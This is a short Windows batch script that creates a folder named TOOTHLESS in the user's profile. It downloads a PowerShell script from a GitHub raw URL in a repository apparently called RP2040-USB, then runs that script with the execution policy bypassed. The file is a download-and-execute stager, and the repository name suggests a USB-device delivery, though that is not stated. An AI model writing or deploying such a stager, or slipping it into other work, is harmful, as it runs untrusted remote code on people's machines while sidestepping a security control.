@echo off
set "TARGET_DIR=C:\Users\%USERNAME%\TOOTHLESS"
set "SCRIPT_PATH=%TARGET_DIR%\code.ps1"
set "URL=https://raw.githubusercontent.com/ZDStudios/RP2040-USB/refs/heads/main/code.ps1"

if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"

powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%SCRIPT_PATH%'"

if exist "%SCRIPT_PATH%" (
    powershell -NoProfile -ExecutionPolicy Bypass -File "%SCRIPT_PATH%"
) else (
    echo [ERROR] Failed to download code.ps1
    pause
)
